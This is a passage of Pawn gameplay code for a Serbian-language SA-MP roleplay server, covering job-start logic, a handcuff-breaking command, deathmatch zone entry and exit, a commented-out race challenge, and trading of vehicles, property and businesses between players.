        if( AccountVerified[ playerid ] == false ) return SendErrorMessage( playerid, "Prvo morate verifikovati svoj nalog(/vf).");

        Novi_SetPlayerPos(playerid, 794.8459,-1312.7743,710.3820);
        SetPlayerFacingAngle(playerid, 86.1438);

        TogglePlayerControllable(playerid, 0);
        defer timerForAnimPornoPlayer(playerid);

        PornoBar[playerid] = CreatePlayerProgressBar(playerid, 320.0, 200.0, 80.0, 8.0, 0xcfcaf1FF, 300.0, BAR_DIRECTION_RIGHT);
        SetPlayerProgressBarValue( playerid, PornoBar[ playerid ], 0.0 );
        ShowPlayerProgressBar( playerid, PornoBar[ playerid ] );

        pornoProgress[playerid] = 0.0;

        radiPorno[playerid] = true;

        KrevetUpotreba = true;

        defer PornoProgressTimer(playerid);

        SendJobMessage(playerid, "Zapoceo si posao Porno Glumice! Moras da dovedes glumca do vrhunca pritiskajuci 'SPACE'!");

        return 1;
    }

    if(PlayerInfo[playerid][xPosao] == POSAO_LOVAC) {

        if( UzeoOpremu[ playerid ] == false ) return SendErrorMessage( playerid, "Nemate opremu!" );
        if(radiLovac[playerid]) return SendErrorMessage(playerid, "Vec radis posao!");
        if( AccountVerified[ playerid ] == false ) return SendErrorMessage( playerid, "Prvo morate verifikovati svoj nalog(/vf).");

        radiLovac[playerid] = true;
        lovacCounter[playerid] = 0;

        GiveWeaponToPlayer(playerid, 33, 100);

        SendJobMessage(playerid, "Zapoceo si posao lovca! Moras da lovis zivotinje po polju i pokupis njihovu kozu!");

        return 1;
    }

    if(PlayerInfo[playerid][xPosao] == POSAO_HAKER) {

        if( UzeoOpremu[ playerid ] == false ) return SendErrorMessage( playerid, "Nemate opremu!" );
        if(playerHacking[playerid] >= 1) return SendErrorMessage(playerid, "Vec radis posao!");
        if(!IsPlayerInRangeOfPoint(playerid, 10.0, 987.3414,-1522.8057,2200.7690)) return SendErrorMessage(playerid, "Moras biti u Hacker Center-u!");
        if( AccountVerified[ playerid ] == false ) return SendErrorMessage( playerid, "Prvo morate verifikovati svoj nalog(/vf).");

        playerHacking[playerid] = 1;

        Novi_DisablePlayerCheckpoint(playerid);
        Novi_SetPlayerCheckpoint(playerid, 1191.8578,-2138.4575,63.9409, 5.0);

        SendJobMessage(playerid, "Idi do tornja!");

        return 1;
    }

    if(PlayerInfo[playerid][xPosao] == POSAO_DELIVERY) {

        if(RadiDelivery[playerid]) return SendErrorMessage(playerid, "Vec radis posao!");
        if(!IsPlayerInRangeOfPoint(playerid, 2.0, -71.5509,-1589.5165,2.6172)) return SendErrorMessage(playerid, "Nisi na mestu!");
        if( AccountVerified[ playerid ] == false ) return SendErrorMessage( playerid, "Prvo morate verifikovati svoj nalog(/vf).");

        Novi_DisablePlayerCheckpoint(playerid);
        DeliveryCP[playerid] = 1;
        RadiDelivery[playerid] = true;

        Novi_SetPlayerCheckpoint(playerid, -85.9277,-1577.2772,2.6172, 5.0);
        Novi_DestroyVehicle(DeliveryVozilo[playerid]);
        DeliveryVozilo[playerid] = V01D_CreateVehicle(414, -71.5509,-1589.5165,2.6172, 180.0000, 0, 0, -1 );
        Novi_PutPlayerInVehicle(playerid, DeliveryVozilo[playerid], 0);

        SendJobMessage(playerid, "Idi na mesto utovara!");

        return 1;
    }

	if( PlayerInfo[ playerid ][ xPosao ] == POSAO_KOSAC ) {
	
		if( UzeoOpremu[ playerid ] == false ) return SendErrorMessage( playerid, "Nemate opremu!" );
		if(!IsPlayerInDynamicArea(playerid, glenParkZona, 0)) return SendErrorMessage(playerid, "Da bi zapoceo kosaca moras biti u Glen Parku!");
		if( KrenuoKosenje[ playerid ] ) return SendErrorMessage( playerid, "Vi vec kosite travu");
        if( AccountVerified[ playerid ] == false ) return SendErrorMessage( playerid, "Prvo morate verifikovati svoj nalog(/vf).");

		AccountVerified[ playerid ] = false;
		
        DisablePlayerCheckpoint(playerid);

        KrenuoKosenje[playerid] = true;

        if(IsValidVehicle(kosacVozilo[playerid]))
            Novi_DestroyVehicle(kosacVozilo[playerid]);

        kosacVozilo[playerid] = -1;

        PokosenaTrava[ playerid ] = 1;
        Novi_SetPlayerCheckpoint(playerid, 1943.2330, -1233.7960, 19.1508, 3.0);

        SendJobMessage(playerid, "Krenuo si sa kosenjem!");

        StaroVreme[ playerid ] = gettime();
    	NovoVreme[ playerid ] = 65;
		return 1;
	}
	else if( PlayerInfo[ playerid ][ xPosao ] == POSAO_RUDAR ) {

	    if( UzeoOpremu[ playerid ] == false ) return SendErrorMessage( playerid, "Nemate opremu!" );
		if( AccountVerified[ playerid ] == false ) return SendErrorMessage( playerid, "Prvo morate verifikovati svoj nalog(/vf).");
		if( PosaoRudar[ playerid ] != 0 ) return SendErrorMessage( playerid, "Vec ste poceli sa poslom." );

		Novi_SetPlayerCheckpoint( playerid, RandomRudnik[ 0 ][ 0 ], RandomRudnik[ 0 ][ 1 ], RandomRudnik[ 0 ][ 2 ], 2.5 );
		CheckpointStatus[ playerid ] = 32;
		SendJobMessage( playerid, "Krenuli ste sa kopanjem ruda, mesto za kopanje je oznaceno crveno na mapi!" );
		PosaoRudar[ playerid ] = 1;
		rudarPosao[ playerid ][ rudarIskopano ] = 0;
		AccountVerified[ playerid ] = false;
		return 1;
	}

    else if( PlayerInfo[ playerid ][ xPosao ] == POSAO_SABOTAZER ) {
        if( RadiSabotazer{playerid} ) return SendErrorMessage(playerid, "Vec si poceo sa poslom!");
        if( UzeoOpremu[ playerid ] == false ) return SendErrorMessage( playerid, "Nemate opremu!" );
        if( AccountVerified[ playerid ] == false ) return SendErrorMessage( playerid, "Prvo morate verifikovati svoj nalog(/vf).");

        Novi_SetPlayerCheckpoint( playerid, -2614.8389,1430.6879,7.1607, 2.0 );
        SabotazerPosloviCP{playerid} = 1;
        RadiSabotazer{playerid} = true;

        PricaSabotazerTimer{playerid} = 0;
        SabotazerVozilo[playerid] = 0;
        UbioKapetana2{playerid} = 0;
        UbioKapetana1{playerid} = 0;
        UpucaKapetana{playerid} = 0;

        SendJobMessage( playerid, "Idi popricaj sa sefom!" );

        AccountVerified[ playerid ] = false;
        return 1;
    }

    else if( PlayerInfo[ playerid ][ xPosao ] == POSAO_MOLER ) {

        if(!IsPlayerInRangeOfPoint(playerid, 10.0, -1685.6660,1035.8398,45.2109)) return SendErrorMessage(playerid, "Nisi na mestu!");
        if( UzeoOpremu[playerid] == false ) return SendErrorMessage( playerid, "Nemate opremu!" );
        if(RadiMoler[playerid]) return SendErrorMessage(playerid, "Vec radis posao!");
        if( AccountVerified[ playerid ] == false ) return SendErrorMessage( playerid, "Prvo morate verifikovati svoj nalog(/vf).");

        MolerZid[0][playerid] = CreatePlayerObject(playerid, 19461, 1745.131835, 1769.557006, 1128.879272, 0.000000, 0.000000, 0.000000, 50.0);
        SetPlayerObjectMaterial(playerid, MolerZid[0][playerid], 0, 3776, "ci_studio", "stageside1", 0x00000000);           
        MolerZid[1][playerid] = CreatePlayerObject(playerid, 19461, 1745.131835, 1759.926391, 1128.879272, 0.000000, 0.000000, 0.000000, 50.0); 
        SetPlayerObjectMaterial(playerid, MolerZid[1][playerid], 0, 3776, "ci_studio", "stageside1", 0x00000000);
        MolerZid[2][playerid] = CreatePlayerObject(playerid, 19461, 1741.641723, 1756.946533, 1128.879272, 0.000000, 0.000000, 90.000000, 50.0); 
        SetPlayerObjectMaterial(playerid, MolerZid[2][playerid], 0, 3776, "ci_studio", "stageside1", 0x00000000);
        MolerZid[3][playerid] = CreatePlayerObject(playerid, 19461, 1732.012084, 1756.946533, 1128.879272, 0.000000, 0.000000, 90.000000, 50.0); 
        SetPlayerObjectMaterial(playerid, MolerZid[3][playerid], 0, 3776, "ci_studio", "stageside1", 0x00000000);
        MolerZid[4][playerid] = CreatePlayerObject(playerid, 19461, 1729.051635, 1760.426757, 1128.879272, 0.000000, 0.000000, 180.000000, 50.0); 
        SetPlayerObjectMaterial(playerid, MolerZid[4][playerid], 0, 3776, "ci_studio", "stageside1", 0x00000000);
        MolerZid[5][playerid] = CreatePlayerObject(playerid, 19461, 1729.051635, 1770.056640, 1128.879272, 0.000000, 0.000000, 180.000000, 50.0); 
        SetPlayerObjectMaterial(playerid, MolerZid[5][playerid], 0, 3776, "ci_studio", "stageside1", 0x00000000);
        MolerZid[6][playerid] = CreatePlayerObject(playerid, 19461, 1733.711547, 1773.356689, 1128.879272, 0.000000, 0.000000, 270.000000, 50.0); 
        SetPlayerObjectMaterial(playerid, MolerZid[6][playerid], 0, 3776, "ci_studio", "stageside1", 0x00000000);
        MolerZid[7][playerid] = CreatePlayerObject(playerid, 19461, 1743.340942, 1773.356689, 1128.879272, 0.000000, 0.000000, 270.000000, 50.0); 
        SetPlayerObjectMaterial(playerid, MolerZid[7][playerid], 0, 3776, "ci_studio", "stageside1", 0x00000000);

        SetPlayerVirtualWorld( playerid, playerid+1);
        SetPlayerPos( playerid, 1736.2239,1764.6915,1128.1322);
        SetCameraBehindPlayer( playerid );
        defer UcitavanjeTimer(playerid);
        GameTextForPlayer( playerid, "Ucitavanje ...", 6000, 4 );

        MolerCP[playerid] = 1;
        RadiMoler[playerid] = true;
        Novi_SetPlayerCheckpoint(playerid, 1743.9640,1770.3379,1128.1322, 3.0);
        return 1;
    }
	
	return 1;
}

CMD:razbijlisice( playerid, params[] ) {

	new id, Float:Pos[ 3 ], policajci = 0;
    if( sscanf( params, "u", id ) ) {
		SendUsageMessage( playerid, "/razbijlisice [ ID/Deo imena ]");
		return 1;
	}
	
	if( !imaSrafciger[playerid] ) return SendErrorMessage( playerid, "Nemas srafciger, kupi ga na Black Marketu!" );
	if( id == playerid ) return SendErrorMessage( playerid, "Ne mozes sam sebi." );
	if( id == IPI ) return SendErrorMessage( playerid, "Pogresan ID korisnika." );
	if( !IsPlayerNearPlayer( 5.0, playerid, id ) ) return SendErrorMessage( playerid, "Niste blizu igraca ciji se ID uneli.");
	if( PlayerCuffed[ playerid ] > 0 ) return SendErrorMessage( playerid, "Ne mozes dok si tazovan ili cuffovan." );

	GetPlayerPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );
	
	foreach( Player, i ) {
	    if( playerid != i && IsPlayerInRangeOfPoint( i, 10, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] ) && GetFactionType( i ) == ORG_TIP_PD ) {
			policajci++;
		}
	}
	
	if( policajci != 0 ) return SendErrorMessage( playerid, "Ne mozes ovo dok ima policajaca u blizini." );
	
    imaSrafciger[playerid] = false;

	PlayerCuffed[ id ] = 0;
    GameTextForPlayer( id, "~g~Razbijene su vam lisice", 2500, 3 );
	TogglePlayerControllable( id, 1 );
	ClearAnimations( id );
	if( IsPlayerAttachedObjectSlotUsed( id, OBJECT_SLOT_RHAND ) ) RemovePlayerAttachedObject( id, OBJECT_SLOT_RHAND );
	SetPlayerSpecialAction( id, SPECIAL_ACTION_NONE );
    return 1;
}

CMD:udjinadm( playerid, params[] ) {
	if( PlayerInfo[ playerid ][ xLevel ] < 3 ) return SendErrorMessage( playerid, "Ne mozes ako nisi level 3+." );
	if( !IsPlayerInRangeOfPoint( playerid, 3.0, 1382.1486, -1088.6586, 28.2120 ) ) return SendErrorMessage( playerid, "Morate biti kod ulaza zgrade za DM(Pitajte Admin/Helper gde je)." );
	if( PlayerInfo[ playerid ][ xWanted ] > 0 ) return SendErrorMessage( playerid, "Ne mozes na DM sa WLom." );
	if( PoliceDuty[ playerid ] ) return SendErrorMessage( playerid, "Ne mozes sa PD duty u DM zonu." );
	
	NaDmEventu[ playerid ] = true;
    new rand = random( sizeof( RandomDMPos ) );
	Novi_SetPlayerPos( playerid, RandomDMPos[ rand ][ 0 ], RandomDMPos[ rand ][ 1 ],RandomDMPos[ rand ][ 2 ] );
	SetPlayerFacingAngle( playerid, 360.000 );
	SetCameraBehindPlayer( playerid );
	SetPlayerInterior( playerid, 0 );
	SetPlayerVirtualWorld( playerid, 10 );

	Novi_SetPlayerHealth( playerid, 150 );
	Novi_SetPlayerArmour( playerid, 100 );
	
	if( PlayerInfo[ playerid ][ xDMEventUbistva ] >= 4500 ) {
	    SendInfoMessage( playerid, "Usao si na DM sa rankom 10." );
	    GiveWeaponToPlayer( playerid, 24, 150 );
		GiveWeaponToPlayer( playerid, 26, 150 );
		GiveWeaponToPlayer( playerid, 28, 400 );
		GiveWeaponToPlayer( playerid, 31, 400 );
		SetPlayerSkillLevel( playerid, WEAPONSKILL_MICRO_UZI, 999 );
		SetPlayerSkillLevel( playerid, WEAPONSKILL_SAWNOFF_SHOTGUN, 999 );
	}
	else if( PlayerInfo[ playerid ][ xDMEventUbistva ] >= 4000 ) {
		SendInfoMessage( playerid, "Usao si na DM sa rankom 9." );
		GiveWeaponToPlayer( playerid, 24, 150 );
		GiveWeaponToPlayer( playerid, 27, 150 );
		GiveWeaponToPlayer( playerid, 32, 800 );
		GiveWeaponToPlayer( playerid, 31, 400 );
		SetPlayerSkillLevel( playerid, WEAPONSKILL_MICRO_UZI, 999 );
	}
	else if( PlayerInfo[ playerid ][ xDMEventUbistva ] >= 3500 ) {
		SendInfoMessage( playerid, "Usao si na DM sa rankom 8." );
		GiveWeaponToPlayer( playerid, 24, 150 );
		GiveWeaponToPlayer( playerid, 27, 150 );
		GiveWeaponToPlayer( playerid, 28, 800 );
		GiveWeaponToPlayer( playerid, 31, 400 );
		SetPlayerSkillLevel( playerid, WEAPONSKILL_MICRO_UZI, 999 );
	}
	else if( PlayerInfo[ playerid ][ xDMEventUbistva ] >= 3000 ) {
		SendInfoMessage( playerid, "Usao si na DM sa rankom 7." );
		GiveWeaponToPlayer( playerid, 24, 150 );
		GiveWeaponToPlayer( playerid, 27, 150 );
		GiveWeaponToPlayer( playerid, 29, 400 );
		GiveWeaponToPlayer( playerid, 31, 400 );
	}
	else if( PlayerInfo[ playerid ][ xDMEventUbistva ] >= 2500 ) {
		SendInfoMessage( playerid, "Usao si na DM sa rankom 6." );
		GiveWeaponToPlayer( playerid, 24, 150 );
		GiveWeaponToPlayer( playerid, 26, 150 );
		GiveWeaponToPlayer( playerid, 29, 400 );
		GiveWeaponToPlayer( playerid, 31, 400 );
	}
	else if( PlayerInfo[ playerid ][ xDMEventUbistva ] >= 2000 ) {
		SendInfoMessage( playerid, "Usao si na DM sa rankom 5." );
		GiveWeaponToPlayer( playerid, 24, 150 );
		GiveWeaponToPlayer( playerid, 26, 150 );
		GiveWeaponToPlayer( playerid, 29, 400 );
		GiveWeaponToPlayer( playerid, 30, 400 );
	}
	else if( PlayerInfo[ playerid ][ xDMEventUbistva ] >= 1500 ) {
		SendInfoMessage( playerid, "Usao si na DM sa rankom 4." );
		GiveWeaponToPlayer( playerid, 24, 150 );
		GiveWeaponToPlayer( playerid, 25, 100 );
		GiveWeaponToPlayer( playerid, 29, 400 );
		GiveWeaponToPlayer( playerid, 31, 400 );
	}
	else if( PlayerInfo[ playerid ][ xDMEventUbistva ] >= 1000 ) {
		SendInfoMessage( playerid, "Usao si na DM sa rankom 3." );
		GiveWeaponToPlayer( playerid, 24, 150 );
		GiveWeaponToPlayer( playerid, 25, 100 );
		GiveWeaponToPlayer( playerid, 29, 400 );
		GiveWeaponToPlayer( playerid, 30, 400 );
	}
	else if( PlayerInfo[ playerid ][ xDMEventUbistva ] >= 500 ) {
		SendInfoMessage( playerid, "Usao si na DM sa rankom 2." );
		GiveWeaponToPlayer( playerid, 24, 200 );
		GiveWeaponToPlayer( playerid, 25, 100 );
		GiveWeaponToPlayer( playerid, 29, 400 );
	}
	else if( PlayerInfo[ playerid ][ xDMEventUbistva ] >= 0 ) {
		SendInfoMessage( playerid, "Usao si na DM sa rankom 1." );
		GiveWeaponToPlayer( playerid, 24, 200 );
		GiveWeaponToPlayer( playerid, 25, 100 );
	}
	
	SendInfoMessage( playerid, "Da izadjes iz DM zone kucaj /izadjizidm." );
    return 1;
}

CMD:izadjiizdm( playerid, params[] ) {

	if( NaDmEventu[ playerid ] == false ) return SendErrorMessage( playerid, "Nisi u DM zoni." );
	if( PlayerInfo[ playerid ][ xZatvor ] != 0 ) return SendErrorMessage( playerid, "Ne mozes dok si u zatvoru." );
    new Float:H; GetPlayerHealth( playerid, H );
	if( H < 10.0 ) return SendErrorMessage( playerid, "Ne mozes da izadjes iz DM zone kada imas manje od 10hp." );
    if( PlayerInfo[ playerid ][ xSpawned ] == 0 ) return SendErrorMessage( playerid, "Ne mozes izaci iz DM zone dok ne budes spawnovan." );

	Novi_SetPlayerPos( playerid, 1382.1486, -1088.6586, 28.2120 );
	SetPlayerFacingAngle( playerid, 360.000 );
	SetCameraBehindPlayer( playerid );
	SetPlayerInterior( playerid, 0 );
	SetPlayerVirtualWorld( playerid, 0 );
	ResetAllWeapons( playerid );
	Novi_SetPlayerHealth( playerid, 70 );
	Novi_SetPlayerArmour( playerid, 0 );

    NaDmEventu[ playerid ] = false;
	SendInfoMessage( playerid, "Izasao si iz DM zone." );
    return 1;
}

// CMD:izadjisatrke( playerid, params[] ) {

//     if( !NaUtrci[ playerid ] ) return SendErrorMessage( playerid, "Niti na trci." );
//     new izazivac = PonudioIgrac[ playerid ];

//     DisablePlayerRaceCheckpoint( playerid );
// 	NaUtrci[ playerid ] = false; Krugovi[ playerid ] = 0; TrkaIzazov[ playerid ] = 0; StaroVreme[ playerid ] = 0;
// 	Novi_DestroyVehicle( TrkaVozilo[ playerid ] ); TrkaVozilo[ playerid ] = -1;
// 	Novi_SetPlayerPos( playerid, PlayerPos[ playerid ][ 0 ], PlayerPos[ playerid ][ 1 ],  PlayerPos[ playerid ][ 2 ] );
// 	SetPlayerVirtualWorld( playerid, PlayerPosVW[ playerid ] );
// 	SetPlayerInterior( playerid, PlayerPosInt[ playerid ] ); TrkaCheckpoint[ playerid ] = 0;
// 	SendInfoMessage( playerid, "Izasli ste sa trke i izgubili %d$.", UlogTrke[ playerid ] );

// 	if( izazivac != IPI ) {

// 		DisablePlayerRaceCheckpoint( izazivac );
// 		SendInfoMessage( izazivac, "Igrac je napustio trku i osvojili ste %d$.", ( UlogTrke[ playerid ]*2 ) );
//         DajIgracuNovac( izazivac, ( UlogTrke[ playerid ]*2 ) );
// 		NaUtrci[ izazivac ] = false; Krugovi[ izazivac ] = 0; TrkaIzazov[ izazivac ] = 0; StaroVreme[ izazivac ] = 0;
//         Novi_DestroyVehicle( TrkaVozilo[ izazivac ] ); TrkaVozilo[ izazivac ] = -1;
//         Novi_SetPlayerPos( izazivac, PlayerPos[ izazivac ][ 0 ], PlayerPos[ izazivac ][ 1 ],  PlayerPos[ izazivac ][ 2 ] );
// 		SetPlayerVirtualWorld( izazivac, PlayerPosVW[ izazivac ] );
// 		SetPlayerInterior( izazivac, PlayerPosInt[ izazivac ] ); TrkaCheckpoint[ izazivac ] = 0;
// 	}
//     return 1;
// }

// CMD:izazovinatrku( playerid, params[] ) {
// 	new id, broj, model, ulog;
//     if( sscanf( params, "uii", id, broj, ulog ) ) {
//         SendUsageMessage( playerid, "/izazovinatrku [ ID/Deo imena ] [ broj ] [ Ulog ]");
//         SCM( playerid, BELA, "[Broj] 1. Sultan 2. Infernus 3. Bullet 4. Elegy 5. Turismo");
//         SCM( playerid, BELA, "[Broj] 6. Quad 7. Sabre 8. Hotring Racer 9. NRG-500 10. Tractor");
//         SCM( playerid, BELA, "[Ulog] Ukoliko je ulog 0, igracete bez uloga." );
//         return 1;
// 	}
	
// 	if( ( PlayerInfo[ playerid ][ xAdmin ] > 0 && PlayerInfo[ playerid ][ xAdmin ] < 7 ) || PlayerInfo[ playerid ][ xSupporter ] > 0 ) {
// 	    new hour, minute, second;
// 		gettimeEx( hour, minute, second );
// 		FixHour( hour );
// 		hour = shifthour;

// 		if( ( hour >= 00 ) && ( hour <= 08 ) ) { }
// 		else return SendErrorMessage( playerid, "Admin/Helper moze na trku samo od 00h do 08h." );
// 	}
	
// 	if( id == IPI ) return SendErrorMessage( playerid, "Pogresan id igraca." );
// 	if( id == playerid ) return SendErrorMessage( playerid, "Ne mozes sam sebe da izazoves." );
// 	if( NaUtrci[ playerid ] ) return SendErrorMessage( playerid, "Vec si na trci." );
//     if( NaUtrci[ id ] ) return SendErrorMessage( playerid, "Igrac je vec na trci." );
//     if( PljackaNovac[ playerid ] > 0 ) return SendErrorMessage( playerid, "Ne mozes da ides na trku dok si u toku pljacke." );
//     if( PljackaNovac[ id ] > 0 ) return SendErrorMessage( playerid, "Ne mozes da invite igraca koji je u toku pljacke." );
//     if( PljackaZlato[ playerid ] > 0 ) return SendErrorMessage( playerid, "Ne mozes da ides na trku dok si u toku pljacke." );
//     if( PljackaZlato[ id ] > 0 ) return SendErrorMessage( playerid, "Ne mozes da invite igraca koji je u toku pljacke." );
// 	if( broj < 1 || broj > 10 ) return SendErrorMessage( playerid, "Broj moze ici od 1 do 10." );
// 	if( ulog < 0 ) return SendErrorMessage( playerid, "Ulog ne moze biti manji od 0." );
// 	if( PlayerInfo[ playerid ][ xLevel ] < 3 ) return SendErrorMessage( playerid, "Ne mozes ako nisi level 3+." );
// 	if( PlayerCuffed[ playerid ] >= 1 ) return SendErrorMessage( playerid, "Ne mozes na izazov dok si cuffovan." );
//     if( IgracZavezan[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes na izazov dok si vezan." );
// 	if( IsPlayerInAnyVehicle( playerid )  ) return SendErrorMessage( playerid, "Morate biti na nogamo da bi otisli na izazov." );
// 	if( GetPlayerState( playerid ) != PLAYER_STATE_ONFOOT ) return SendErrorMessage( playerid, "Morate biti na nogamo da bi otisli na izazov." );
// 	if( GetPlayerInterior( playerid ) != 0 ) return SendErrorMessage( playerid, "Ne mozete koristiti u interijeru." );
// 	if( GetPlayerVirtualWorld( playerid ) != 0 ) return SendErrorMessage( playerid, "Ne mozete koristiti u interijeru/vwu." );
// 	if( PlayerInfo[ playerid ][ xWanted ] >= 1 ) return SendErrorMessage( playerid, "Ne mozete na izazov dok imate wanted.");
//     if( PlayerInfo[ playerid ][ xZatvor ] >= 1 ) return SendErrorMessage( playerid, "Ne mozete na izazov dok ste u zatvoru / Area51.");
//     if( PlayerInfo[ playerid ][ xNovac ] < ulog ) return SendErrorMessage( playerid, "Nemate dovoljno novca za ulog." );

// 	if( ServerInfo[ BrojKreiranihVozila ] > MaxBrojKreiranih ) return SCM( playerid, SVETLOCRVENA, "| V:AC | Nemoguce je trenutno otici na izazov, limit vozila na serveru je dosegnut.");
	
// 	switch( broj ) {
// 	    case 1: model = 560;
// 	    case 2: model = 411;
// 	    case 3: model = 541;
// 	    case 4: model = 562;
// 	    case 5: model = 451;
// 	    case 6: model = 471;
// 	    case 7: model = 475;
// 	    case 8: model = 502;
// 	    case 9: model = 522;
// 	    case 10: model = 531;
// 	}
	
// 	PonudioIgrac[ id ] = playerid;
// 	PonudioIgrac[ playerid ] = id;
// 	UlogTrke[ id ] = ulog;
// 	UlogTrke[ playerid ] = ulog;
	
//     ModelTrke[ id ] = model;

//     new string[ 512 ];
// 	format( string, sizeof( string ), "Igrac %s vas je izazvao na trku sa %s.\nUlog trke je %d$\nDa prihvatis pretisni na 'Prihvati'.\nDa odustanes pritisni na 'Odustani'", ImeIgraca( playerid ), GetVehicleNameEx( model ), ulog );

//     SPD( id, dialog_IZAZOVITRKA, DSMSG, D_NASLOV, string, D_ODABERI, D_ODUSTANI );
    
//     SendInfoMessage( playerid, "Izazvali ste na trku %s.", ImeIgraca( id ) );
//     return 1;
// }

CMD:zamenavozila( playerid, params[] ) {

	new id, moj, njegov;

	if( sscanf( params, "uii", id, moj, njegov ) ) {
	    SendUsageMessage( playerid, "/zamenavozila [ ID Igraca ] [ vas slot vozila ] [ igracev slot vozila ]" );
	    return 1;
    }
    
    if( id == playerid ) return SendErrorMessage( playerid, "Ne mozes zameniti sam sa sobom." );
    if( moj < 1 || moj > 4 || njegov < 1 || njegov > 4 ) return SendErrorMessage( playerid, "Slotovi ne moze ispod 1 ili iznad 4." );
	new slot1 = moj-1, slot2 = njegov-1;
	if( PlayerInfo[ playerid ][ xVoziloID ][ slot1 ] == -1 ) return SendErrorMessage( playerid, "Nemate vozilo u tom slotu." );
    if( PlayerInfo[ id ][ xVoziloID ][ slot2 ] == -1 ) return SendErrorMessage( playerid, "Igrac nema vozilo u tom slotu." );
    if( !IsPlayerNearPlayer( 5.0, playerid, id ) ) return SendErrorMessage( playerid, "Niste blizu igraca.");

	new coordsstring[ 256 ];
	
    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
	    
	format( coordsstring, sizeof( coordsstring ), ""col_white"Igrac "col_crvena"%s "col_white"vam je ponudio zamenu.\n", ImeIgraca( playerid ) );
	strcat( DialogStrgEx, coordsstring );
	format( coordsstring, sizeof( coordsstring ), ""col_white"U zameni je ponudjeno vozilo marke "col_crvena"%s.\n", GetVehicleNameEx( GetVehicleModel( VehicleInfo[ PlayerInfo[ playerid ][ xVoziloID ][ slot1 ] ][ vID ] ) ) );
	strcat( DialogStrgEx, coordsstring );
	format( coordsstring, sizeof( coordsstring ), ""col_white"Igrac od vas trazi vozilo marke "col_crvena"%s.\n", GetVehicleNameEx( GetVehicleModel( VehicleInfo[ PlayerInfo[ id ][ xVoziloID ][ slot2 ] ][ vID ] ) ) );
	strcat( DialogStrgEx, coordsstring );
	strcat( DialogStrgEx, ""col_white"Izaberite da li prihvatate ili odbijate zamenu." );
	
	SPD( id, dialog_ZAMENA_2, DSMSG, D_NASLOV, DialogStrgEx, "Prihvati", "Odbij" );
	
	strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
	
	
	GlobalID[ id ] = PlayerInfo[ playerid ][ xVoziloID ][ slot1 ];
	GlobalID_2[ id ] = PlayerInfo[ id ][ xVoziloID ][ slot2 ];
	GlobalProdaja[ id ] = playerid;
	
	SendInfoMessage( playerid, "Uspesno ste ponudili zamenu vozila igracu "col_crvena"%s.", ImeIgraca( id ) );
	SendInfoMessage( playerid, "Vase vozilo: "col_crvena"%s "col_white"| Njegovo vozilo: "col_crvena"%s", GetVehicleNameEx( GetVehicleModel( VehicleInfo[ PlayerInfo[ playerid ][ xVoziloID ][ slot1 ] ][ vID ] ) ), GetVehicleNameEx( GetVehicleModel( VehicleInfo[ PlayerInfo[ id ][ xVoziloID ][ slot2 ] ][ vID ] ) ) );
	return 1;
}

CMD:zamenaimovina( playerid, params[] ) {

	new id, moj, njegov;

	if( sscanf( params, "uii", id, moj, njegov ) ) {
	    SendUsageMessage( playerid, "/zamenaimovina [ ID Igraca ] [ vas slot imovine ] [ igracev slot imovine ]" );
	    return 1;
    }

    if( id == playerid ) return SendErrorMessage( playerid, "Ne mozes zameniti sam sa sobom." );
    if( moj < 1 || moj > 3 || njegov < 1 || njegov > 3 ) return SendErrorMessage( playerid, "Slotovi ne moze ispod 1 ili iznad 3." );
	new slot1 = moj-1, slot2 = njegov-1;
	if( PlayerInfo[ playerid ][ xProperty ][ slot1 ] == -1 ) return SendErrorMessage( playerid, "Nemate imovinu u tom slotu." );
    if( PlayerInfo[ id ][ xProperty ][ slot2 ] == -1 ) return SendErrorMessage( playerid, "Igrac nema imovine u tom slotu." );
    if( !IsPlayerNearPlayer( 5.0, playerid, id ) ) return SendErrorMessage( playerid, "Niste blizu igraca.");

	new coordsstring[ 256 ];

    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );

	format( coordsstring, sizeof( coordsstring ), ""col_white"Igrac "col_crvena"%s "col_white"vam je ponudio zamenu.\n", ImeIgraca( playerid ) );
	strcat( DialogStrgEx, coordsstring );
	format( coordsstring, sizeof( coordsstring ), ""col_white"U zameni je ponudjena "col_crvena"%s vrednosti %d$.\n", GetPropertyAName( PlayerInfo[ playerid ][ xProperty ][ slot1 ] ), II[ PlayerInfo[ playerid ][ xProperty ][ slot1 ] ][ iPrice ] );
	strcat( DialogStrgEx, coordsstring );
	format( coordsstring, sizeof( coordsstring ), ""col_white"Igrac od vas trazi "col_crvena"%s vrednosti %d$.\n", GetPropertyName( PlayerInfo[ id ][ xProperty ][ slot2 ] ), II[ PlayerInfo[ id ][ xProperty ][ slot2 ] ][ iPrice ] );
	strcat( DialogStrgEx, coordsstring );
	strcat( DialogStrgEx, ""col_white"Izaberite da li prihvatate ili odbijate zamenu." );

	SPD( id, dialog_ZAMENA_4, DSMSG, D_NASLOV, DialogStrgEx, "Prihvati", "Odbij" );

	strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );


	GlobalID[ id ] = PlayerInfo[ playerid ][ xProperty ][ slot1 ];
	GlobalID_2[ id ] = PlayerInfo[ id ][ xProperty ][ slot2 ];
	GlobalProdaja[ id ] = playerid;

	SendInfoMessage( playerid, "Uspesno ste ponudili zamenu imovine igracu "col_crvena"%s.", ImeIgraca( id ) );
	return 1;
}

CMD:zamenafirmi( playerid, params[] ) {

	new id, moj, njegov;

	if( sscanf( params, "uii", id, moj, njegov ) ) {
	    SendUsageMessage( playerid, "/zamenafirmi [ ID Igraca ]" );
	    return 1;
    }

    if( id == playerid ) return SendErrorMessage( playerid, "Ne mozes zameniti sam sa sobom." );
	if( PlayerInfo[ playerid ][ xFirmaID ] == -1 ) return SendErrorMessage( playerid, "Nemate firmu." );
    if( PlayerInfo[ id ][ xFirmaID ] == -1 ) return SendErrorMessage( playerid, "Igrac nema firmu." );
    if( !IsPlayerNearPlayer( 5.0, playerid, id ) ) return SendErrorMessage( playerid, "Niste blizu igraca.");

    new coordsstring[ 256 ];

    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );

	format( coordsstring, sizeof( coordsstring ), ""col_white"Igrac "col_crvena"%s "col_white"vam je ponudio zamenu.\n", ImeIgraca( playerid ) );
	strcat( DialogStrgEx, coordsstring );
